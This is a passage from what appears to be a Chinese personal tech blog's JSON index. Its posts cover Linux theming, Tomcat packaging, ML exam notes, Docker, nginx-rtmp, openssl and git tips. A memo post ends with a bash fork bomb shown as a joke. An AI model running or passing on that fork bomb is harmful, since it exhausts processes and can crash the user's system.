McOS-HS-2-themes.tar.gz#go to tweaks and chose this themetar -zxvf macOS11.tar.xz #extensions.gnome.org [dash-to-dock]#www.gnome-look.org [OSX.for.Dash.to.DOCK]#www.gnome-look.org [Icon Themes: macOS icons]# extensioons.gnome.org [blyr] go to tweaks and choose them cd ./OSX.for.Dash.to.DOCK/Dock Settings/ 12345678gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top truegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots falsegsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink falsegsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT 12345#www.gnome-look.org [GDM themes:SetAsWallpaper]mv ubuntu.css /usr/share/gnome-shell/theme/sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/ upgrade后锁屏界面恢复的问题SetAsWallpaper里的ubuntu.css 更改到/usr/share/gnome-shell/theme/下，并把壁纸更换就ok了，因为upgrade的时候会更新gnome，theme会重新从源下载覆盖","categories":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"tweak","slug":"tweak","permalink":"http://waynamigo.github.io/tags/tweak/"}]},{"title":"用了个bash手动打包java项目并在tomcat中运行","slug":"2019-07-03-经管同学的tomcat项目","date":"2019-07-02T16:00:00.000Z","updated":"2022-07-16T04:45:09.838Z","comments":true,"path":"2019/07/03/2019-07-03-经管同学的tomcat项目/","link":"","permalink":"http://waynamigo.github.io/2019/07/03/2019-07-03-经管同学的tomcat项目/","excerpt":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下, （推荐了maven","text":"觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下, （推荐了maven jdbc和tomcat和手写的DAO，怀旧。用idea打包： 先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。 将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INFbuild project 再 build artifacts 好了但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd 项目结构这样 12345678910111213141516171819├── bin│ └── out.jar├── build│ └── source.txt├── build.sh├── classdesign.war├── out│ ├── artifacts│ └── production├── src│ ├── com│ └── MANIFEST.MF└── web ├── commom ├── css ├── iconfont ├── images ├── js └── WEB-INF 然后手动打包了，（写了个循环shellfor javac）代码在这 1234567891011121314151617181920212223242526272829303132#!/usr/bin/bash#写到source，做个list，或者直接用idea生成source.txt也可以path=$(pwd)dependence()&#123;for file in `ls $1|grep -v \".bak\"` do if [ -d $1\"/\"$file ] then dependence $1\"/\"$file else local file_path=$1\"/\"$file if echo $file_path|grep \"MANIFEST.MF\"&gt;/dev/null;then c=c else echo $file_path &gt;&gt; $path/build/source fi fi done&#125;dependence $path/srclibs=\"\"for java_lib in $(ls $path/web/WEB-INF/lib);doif [[ libs != \"\" ]];thenlibs=$libs:$path/web/WEB-INF/lib/$java_libelselibs=$path/web/WEB-INF/lib/$java_libfidonejavac -encoding utf-8 -Xlint:unchecked -d $path/build -classpath $path/web/WEB-INF/lib @$path/build/sourcejar cvf $path/src/MANIFEST.MF $path/bin/classdesign.war ./* 把war烤到webapps执行startup.sh就可以运行了2019.7.19更新在开发板上（无IDE生成MAINFEST)打包注意jar时添加-m追加MAINFEST.MF的Main-Class字段 123456jar -cvfm test.jar MAINFEST.MF test.class MAINFEST.MFManifest-Version: 1.0Main-Class: &lt;MAINCLASSNAME&gt;","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"tomcat","slug":"tomcat","permalink":"http://waynamigo.github.io/tags/tomcat/"},{"name":"bash","slug":"bash","permalink":"http://waynamigo.github.io/tags/bash/"}]},{"title":"机器学习考试","slug":"2019-06-25-machinelearning","date":"2019-06-24T16:00:00.000Z","updated":"2023-01-01T12:01:32.519Z","comments":true,"path":"2019/06/25/2019-06-25-machinelearning/","link":"","permalink":"http://waynamigo.github.io/2019/06/25/2019-06-25-machinelearning/","excerpt":"统 计 学 习真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，","text":"统 计 学 习真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本， 题型选择 3分×9简答题 5分×5综合分析 7分×7 绪论，回归 按学习方式分类的机器学习算法 四类 模型评估指标：泛化误差、经验误差 欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等） 分类和聚类和回归的区别 12回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出聚类是无监督学习，产生多个集合，单个集合中的元素属性相似 多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数 非线性回归如何进行计算:通过中间函数映射 岭回归的特点（简答？ LDA 应该有大题 LDA结构，LDA生成文档D的步骤（简答 使用LDA的目的：得到文章库中每篇文章的主题分布； 得到新输入文章的主题分布。 决策树 随机森林 支持向量机 决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。 学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性） 预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。 决策树（简答） 1234567891构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程2生成停止条件当前结点包含的样本全属于同一类别，无需划分;当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;当前结点包含的样本集合为空，不能划分.3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。（预剪后剪的对比） 对节点划分的方法 信息增益 增益率 基尼指数 12信息增益=△信息熵，信息熵越小纯度越大根据基尼指数：选取划分后使基尼指数最小的属性 随机森林（简答） 12345678原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树每棵树最大限度地生长,不做任何修剪将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。 支持向量机 12概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）决策边界是对学习样本求解的最大边距超平面 间隔，最大间隔 超平面的距离计算（可能考计算 r = |w.T·x+b|/|w| 核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数神经网络 kmeans 结构 123输入层：接受来自网络外部的数据的顶点隐藏层：除了输入层和输出层以外的其他层输出层：向网络外部输出数据的顶点 超参数有哪些 如何衡量你的预测算法，损失函数loss 感知机是啥 BP是啥 RBF是啥 hopfield是啥 SOM是啥 计算隐藏层结点数目 12隐层结点数s与模式数N的关系是：s＝log2N；隐层结点数s＝2n＋1（n为输入层结点数）； CNN LSTM 聚类 1234567891011优点1.原理简单，实现方便，收敛速度快；2.聚类效果较优；3.模型的可解释性较强；4.调参只需要簇数k；缺点：1.k的选取不好把握；2.初始聚类中心的选择；3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；4.采用的是迭代的方法，只能得到局部最优解；5.对于噪声和异常点比较敏感。 聚类性能度量 外部指标 内部指标 12外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"}]},{"title":"这学期项目中的坑","slug":"2019-06-12-项目坑","date":"2019-06-11T16:00:00.000Z","updated":"2022-07-16T04:45:11.688Z","comments":true,"path":"2019/06/12/2019-06-12-项目坑/","link":"","permalink":"http://waynamigo.github.io/2019/06/12/2019-06-12-项目坑/","excerpt":"佛了","text":"佛了 mysql分离 + springboot + eurake123456原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.解决方法是对nextval设置初始值，stackoverflow的另一种方案是改掉注释@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = GenerationType.IDENTITY)","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://waynamigo.github.io/tags/mysql/"},{"name":"Spring","slug":"Spring","permalink":"http://waynamigo.github.io/tags/Spring/"}]},{"title":"jekyll加入live2d的模型","slug":"2019-05-14-jekyll加入live2d模型","date":"2019-05-13T16:00:00.000Z","updated":"2022-07-16T04:45:11.404Z","comments":true,"path":"2019/05/14/2019-05-14-jekyll加入live2d模型/","link":"","permalink":"http://waynamigo.github.io/2019/05/14/2019-05-14-jekyll加入live2d模型/","excerpt":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下2019-8-1: 迁hexo了。","text":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下2019-8-1: 迁hexo了。 安装hexonpm install hexo-cli 使用hexo初始化一个本地的博客文件夹 hexo init 安装需要的依赖 npm install就可以了 在hexo安装live2d插件1yarn add hexo-helper-live2d 详见 hexo-helper-live2d 在hexo配置一下在config里面加入live2d的配置 12345678910111213141516171819hexo-helper-live2d项目给的配置文件例子live2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 display: superSample: 2 width: 150 height: 300 position: right hOffset: 0 vOffset: -20 mobile: show: true scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。 koharu在这里面live2d-widget-model clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。 配置文件如下（注释是wife还行） 123456789101112#wifelive2d: enable: true pluginModelPath: assets/ model: use: koharu #模板目录，在node_modules里 display: position: right width: 150 height: 300 mobile: show: false 启动hexo，会自动编译生成可用的模型文件目的文件live2d文件夹，编译后的文件目录如下 12_config.yml live2d_models package.json scaffolds themesdb.json node_modules public source 在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了12&lt;script src=\"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887\"&gt;&lt;/script&gt;&lt;script&gt;L2Dwidget.init(&#123;\"pluginModelPath\":\"assets/\",\"model\":&#123;\"jsonPath\":\"/live2dw/assets/koharu.model.json\"&#125;,\"display\":&#123;\"position\":\"right\",\"width\":150,\"height\":300&#125;,\"mobile\":&#123;\"show\":false&#125;,\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false&#125;);&lt;/script&gt;","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"live2d","slug":"live2d","permalink":"http://waynamigo.github.io/tags/live2d/"}]},{"title":"软件工程经济学","slug":"2019-05-04-软件工程经济学","date":"2019-05-03T16:00:00.000Z","updated":"2022-07-16T04:45:11.123Z","comments":true,"path":"2019/05/04/2019-05-04-软件工程经济学/","link":"","permalink":"http://waynamigo.github.io/2019/05/04/2019-05-04-软件工程经济学/","excerpt":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等","text":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等 软件工程经济学基础总览12345678910requirementdesignconstructure 详细设计和总体设计在design完成，testingmaintenanceconfigure management，软件团队的管理办法management tools and methodengineering processquality 货币的时间成本，举例说明这个概念的重要性1、货币时间成本按利率衡量特定时间内 ，利息/借贷资本 利息计算方法12单利 I = iP N ==&gt; 利率*存款*计息周期数复利 F = P（1+i）^N 掌握的重要概念part1利率、利息额、借贷资本总额通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）利息的计算方法：单利、复利、计息期（一般为年，或换算为年）等值计算的概念和意义（现值、折现率）等额支付（等额本金、等额本息）税收、营业税、增值税、营改增贬值、折旧 工程经济学的概念工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。对软件工程领域来说， 金融学明确目标周期机构商业战略 管理现今流量管理 会计学原理资产对外投资固定资产货币资金收入费用利润 现金流量现金的定义 指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等 一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。 是企业财力的评价指标之一 现金流量图12345678910现金流入流出|||||_________________| 时间,指财务周期||| 支付方式等额支付 线性梯度支付p=G{}几何梯度支付第二年 = 第一年* (1+G) 通货膨胀纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科） 折现衡量现金流量，税收， 税收营业 教育 增值 基准收益率与利率的区别基准收益率也被称为基准折现率。区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。基准利率由中国人民银行制定。区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。软件行业的基准收益率是15%。 发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍 部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，2018中国软件行业基准数据报告 cpi ， spiCPI=EV/AC，SPI=EV/PV cpi 成本绩效指标甘特图 贬值进度计划进度控制指标spi &lt;1 进度落后 =1 按计划进行 &gt;1 超前进行开发者效率 软件项目质量ISO度量 软件质量保证制定推行软件工程质量标准研究 采用各种技术手段控制各种变更制定并执行测试计划按质量标准对软件质量进行度量组织各种技术评审会","categories":[{"name":"软件工程经济学","slug":"软件工程经济学","permalink":"http://waynamigo.github.io/categories/软件工程经济学/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/tags/其他/"}]},{"title":"备忘的一些操作","slug":"2019-04-17-备忘的一些烦人操作","date":"2019-04-16T16:00:00.000Z","updated":"2022-07-16T04:45:11.593Z","comments":true,"path":"2019/04/17/2019-04-17-备忘的一些烦人操作/","link":"","permalink":"http://waynamigo.github.io/2019/04/17/2019-04-17-备忘的一些烦人操作/","excerpt":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题","text":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题 证书ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。 based on SSL&amp;TLS 生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新） 如果没有的话可以下载包ca-certificates 123456789101112public:openssl rsa -in rsa_private.key -pubout -out rsa_public.keyprivate ase256加密:openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048签postfix实现加密，关键的两步:由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pemcat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，使用postmap生成用户名和密码的hash表重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了 怪事情，opencv的cvtColor突然不能用，但是服务器上没问题 解决方法找了其他源。。1conda install --channel https://conda.anaconda.org/menpo opencv3 shell以前记的笔记(_ _)12345678开头加一句#!/bin/bash 说明是一个脚本变量不需要声明可以直接用变量取值的话加美元If while中条件注意空格变量赋值不加空格Echo重定向：如果需要变量值和字符串相连，加大括号。没写i自增导致死循环If后一定要写fi代表结束，汇编格式吼啊 一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚 12345678910111213141516171819202122 在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量的完整类型定义的情况（因为有用 typedef 封装），从而有可能遇到编译出错。 例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 ino_t，而我们不清楚 ino_t的准确定义究竟是什么。可以用如下方法：声明一个这样的变量即可。#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;int main() &#123; ino_t blah; return 0;&#125;然后运行如下指令：gcc -E test.c | grep ino_t-E 选项的意思是：在预处理过程后结束并输出到标准输出。文档原文如下-E Stop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output. c文件生成的步骤 1C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。 查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态， 不会awk的时候感觉这是个什么东西orz 1netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos; 安装lua的时候 readline缺失1安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个 树莓派摄像头（非dsi口） 可以这样 1mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv:// python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了 tx云cdn123配置cdn源站信息： 自有源站，waynamigo.github.io回源配置： 回源host，waynamigo.cn 发现使用shadowsocks还行，那个ssr扔了1sudo sslocal -c /etc/shadowsocks/config.json -d start sslocal 直接用apt安装shadowsocks 使用的流媒体搭建12345678910111213git clone https://github.com/arut/nginx-rtmp-module.gitwget http://nginx.org/download/nginx-1.8.1.tar.gz tar -zxvf nginx-1.8.1.tar.gz cd nginx-1.8.1 先安装一下依赖yum install pcre-develyum install zlib zlib-develyum install openssl openssl-devel./configure --prefix=/usr/local/nginx --add-module=../nginx-rtmp-module --with-http_ssl_module make make install /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920212223rtmp &#123; server &#123; listen 1935; #监听的端口 chunk_size 4000; application hls &#123; #rtmp推流请求路径 live on; hls on; hls_path /usr/share/nginx/html/hls; hls_fragment 5s; &#125; &#125; &#125; 修改server模块的location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; git配置多用户.ssh/config 1234Host github.com HostName github.com IdentityFile ~/.ssh/id_rsa_qq User nanamya 1234567cd .git设置本项目的用户名和邮箱git config user.name \"yourname\"git config user.email \"youremail\"如果重设 则：git config --global --unset user.namegit config --global --unset user.email 如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息ssh -vT git@github.com 提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access. 更换用户 作死小能手 :() { function :|:&amp; }; :","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"}]},{"title":"NeuralRecon for 3D reconstruction in real-time","slug":"2019-04-01-评估模型算法指标的计算","date":"2019-03-31T16:00:00.000Z","updated":"2022-07-16T04:45:11.825Z","comments":true,"path":"2019/04/01/2019-04-01-评估模型算法指标的计算/","link":"","permalink":"http://waynamigo.github.io/2019/04/01/2019-04-01-评估模型算法指标的计算/","excerpt":"","text":"","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://waynamigo.github.io/categories/深度学习/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"Object Detection","slug":"Object-Detection","permalink":"http://waynamigo.github.io/tags/Object-Detection/"},{"name":"Segmentation","slug":"Segmentation","permalink":"http://waynamigo.github.io/tags/Segmentation/"}]},{"title":"docker笔记整理（二）","slug":"2019-03-27-docker笔记二","date":"2019-03-26T16:00:00.000Z","updated":"2022-07-16T04:45:11.247Z","comments":true,"path":"2019/03/27/2019-03-27-docker笔记二/","link":"","permalink":"http://waynamigo.github.io/2019/03/27/2019-03-27-docker笔记二/","excerpt":"咕","text":"咕 C dockerhub ： waynamigoLet’s try a first example. Here’s a dummy equation: RUD","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"docker笔记整理（一）","slug":"2019-03-21-docker笔记整理一","date":"2019-03-20T16:00:00.000Z","updated":"2022-07-16T04:45:11.793Z","comments":true,"path":"2019/03/21/2019-03-21-docker笔记整理一/","link":"","permalink":"http://waynamigo.github.io/2019/03/21/2019-03-21-docker笔记整理一/","excerpt":"基本使用方法","text":"基本使用方法 使用docker仓库 首先，docker的一个镜像是由多层组成的，每一层一个id，在pull的时候可以看到 以下面为例，imageID是镜像的唯一id，但是镜像的完整id是第三行的sha256哈希值，使用docker images 指令的时候，默认id的位数显示是截断的，可以后跟参数–no-trunc=true来显示全部 12345REPOSITORY TAG IMAGE IDubuntu latest 94e814e2efa8Digest: sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499从官方下载，默认 docker pull &lt;image&gt;:&lt;tag&gt;如果从第三方下载，需要在仓库前指定完整仓库地址（例如hub.c.163.com/public/&lt;image&gt;:&lt;tag&gt;） 如果感觉DockerHub慢的话，可以使用镜像代理 https://registry.docker-cn.com。 123456/etc/systemd/system/docker.service.d/http_proxy.conf [Service]Environment=\"HTTPS_PROXY=https://registry.docker-cn.com\"然后systemctl daemon-reload，先reload units，重新加载一下配置单元，再重启docker服务systemctlrestart docker 除了docker images，还有一个docker inspect &lt;image&gt;:&lt;tag&gt; 查看详细信息(json) docker history &lt;image&gt;:&lt;tag&gt;查看历史信息 12345678[ &#123; \"Id\": \"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499\", \"RepoTags\": [ \"ubuntu:latest\" ] &#125;] 基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等 docker search搜索镜像，也是按关键字来的。（你搜docker search mysql可以搜到MariaDB docker image prune -f，强删本地垃圾。创建 基于本地已有镜像创建，docker commit，和git格式差不多 123456格式：docker commit -m 'message' -a 'authorname' &lt;changed imageid or name&gt; &lt;yourimage&gt;:&lt;tag&gt;docker commit -m 'add one file' -a 'waynamigo' c4b6b5b3e7d8 myimage:waynamigops:另外两个参数为-c 执行dockerfile，在后面整理-p 提交时暂停容器的进程 基于本地模板导入（只用了OpenVZ提供的一个linux模板搞了一下，准备有时间拿上学期的floppylinux的文件弄一个镜像 1cat &lt;filename&gt; | docker import - &lt;image&gt;:&lt;tag&gt;,后者为自定义的名字，导入成功后会显示镜像id 基于dockerfile创建镜像，下面是一个demo 1234567891011121314FROM centos #指定基镜像 MAINTAINER waynamigo #该镜像维护者的信息（我）COPY jdk1.8.0_79 jdk1.8.0_79 #从centos复制jdk，（竟然没有openjdk。。。还得配置环境变量ADD &lt;localfile&gt; # 跑了一个jar。。ENV JAVA_HOME=/jdk1.8.0_79ENV PATH=$JAVA_HOME/bin:$PATHENV CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarEXPOSE 8080 #开放8080端口，其实不用写，因为jar里面已经把yml的配置打包好了ENTRYPOINT [\"java\",\"-jar\",\"/filename\"] 123docker build -t waynamigo:webapp .生成后就可以创建容器并运行了docker run -p localhost:8080:8080 --name webapp_running waynamigo:webapp 不放心的话可以进去康康123docker run -it waynamigo:webapp# 运行这个docker容器top # 看进程lsof -i:8080 # 或者看端口占用 保存镜像 导出到本地，格式类似gcc++ 1docker save &lt;image&gt;:&lt;tag&gt; -o xxx.tar 如果要重新导入，使用 12docker load -i xxx.tardocker load &lt; xxx.tar 上传镜像 还是git，docker push 1234567先commitdocker commit -a &lt;authorName&gt; -m &lt;commitInfo&gt; &lt;containerId&gt; &lt;image&gt;:&lt;tag&gt; 或者是单独打tagdocker tag &lt;image&gt;:&lt;tag&gt; waynamigo/&lt;image&gt;:&lt;tag&gt;然后pushdocker push waynamigo/&lt;image&gt;:&lt;tag&gt;","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"学期项目-begining","slug":"2019-03-06-学期项目启动","date":"2019-03-05T16:00:00.000Z","updated":"2022-07-16T04:45:11.660Z","comments":true,"path":"2019/03/06/2019-03-06-学期项目启动/","link":"","permalink":"http://waynamigo.github.io/2019/03/06/2019-03-06-学期项目启动/","excerpt":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容","text":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容 Vision12Through image, video recognition, text recognition, thestudents&apos; words and deeds are processed by the system to determine whether it has adverse effects on public civilization. Environment Support Keras 2.0/2.2 Tensorflow 1.2 PytorchMain ReferencesI GET THE set of papers from HEREVIDEO TO TEXTIMAGE CAPTIONGET THE NAME FORM DETAIL F-CNNCVPRTwo-streamThe development of my Action-Recgnization module is based on Two Stream 《Two-StreamConvolutional Networks for Action Recognition in Videos》. Reasons of using Two-stream The Action-Recgnization is developed on the way of Two-Stream recent years,And researchers have come out many papers on IEEE SCI and others.but the main reason is that I did Video caption last year, both of them are Analyzing Video Infomation, I want try other algorithm to finish my project in higher quality(get higher score). ProcedureGraphviz using dot generate this picture12 the basic of Two-Stream is The Fusion of spatiotemporal information in a dual stream network.orThe KEY POINT is the better Fusion of spatial and temporal features The interaction between layers within a single network, such as ResNet/Inception. between dual-stream networks, including the exploration of different fusion methods. It is worth considering the structure of ResNet and connecting the dual-stream network. This project use the second method. Spatial networkIt mainly captures important object features in video frames. Time series networkboth of them : finetune the ImageNet Document-Quality AttributesEach contains: 12345678910.└── Avaliability(Quality Attributes eg.) ├── Scenario ├── Stimulus Source ├── Stimulus ├── Artifact ├── Environment ├── Response ├── Response measure └── Tactics Avaliability Performance Modifiability Usability Security Testability Scenario Can not identify bad behavior The exported files are shown well New demands&amp;Structural optimization Customers want to export statistics file easily and need a reliable data Databases is intruded Unit testing Stimulus Source System dependencies Customers Developers and Customers Customers Attackers Developers Stimulus Can’t solve information of the video Exporting operation Customers Runtime(?) Sql injection&amp;entitlement Unit testing each module Artifact whole system UI system UI DBMS Code Environment Windows/Linux x86_64/32 in Runtime environment Web browser Runtime environment Web browser Firewall&amp;Encryption Runtime environment Response Send a feedback to backend if can’t analyze the video from surveillance cameras;Retry if can’t export the list of score Export statistics files in 10s Extend and modify functions when come out a new demand Provide a easy-operated UI and reliable information Resist intrusion Each module passed the Test Cases Response measure within 5min;within 5s within 10s All modules is extensible and under the control of the evaluation indexs The satisfaction of user Database is protected Developers Tactics Retry Self-test Increase Resource Efficiency Split Module aaa warm backup Limit Non-determinism Project Details This project explores prominent action recognition models with UCF-101 dataset Perfomance of different models are compared and analysis of experiment results are provided To be continued","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://waynamigo.github.io/categories/深度学习/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"}]},{"title":"强化学习DQN简介","slug":"2019-03-02-强化学习初步","date":"2019-03-01T16:00:00.000Z","updated":"2022-07-16T04:45:09.810Z","comments":true,"path":"2019/03/02/2019-03-02-强化学习初步/","link":"","permalink":"http://waynamigo.github.io/2019/03/02/2019-03-02-强化学习初步/","excerpt":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564","text":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564 概念理解1234预设值：首先将图中的每一条边预设reward，目标节点指向自己的邻接边的reward设100，其他设为0Q、R矩阵： 包括状态action和行为state，作为行列环境反馈: 对于每一次的episode （相当于迭代的东西），每一次尝试attemp，会根据反馈进行对网络更新环境更新. 